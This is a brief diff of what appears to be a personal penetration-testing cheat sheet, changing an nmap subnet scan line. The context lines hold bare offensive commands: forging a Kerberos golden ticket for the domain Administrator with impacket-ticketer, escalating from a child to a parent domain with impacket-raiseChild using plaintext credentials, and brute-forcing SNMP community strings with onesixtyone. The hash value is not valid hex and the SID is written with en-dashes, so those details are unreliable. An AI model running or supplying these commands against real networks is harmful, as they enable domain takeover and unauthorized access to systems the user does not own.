@@ -1,4 +1,4 @@
-sudo nmap -T4 -Pn -sS --top-ports 20 -oA nmap_$(IP) $(IP)/24
+sudo nmap -T5 -Pn --top-ports 20 --open 192.168.239.0/24
 impacket-ticketer -nthash 0f5assasa6f -domain-sid S-1–5–21–2986980474–46765180–2505414123 -domain 'domain.local' Administrator
 impacket-raiseChild -target-exec 172.16.5.5 "child.domain.local/administrator:password123"
 onesixtyone $(IP) -c /usr/share/seclists/Discovery/SNMP/snmp-onesixtyone.txt
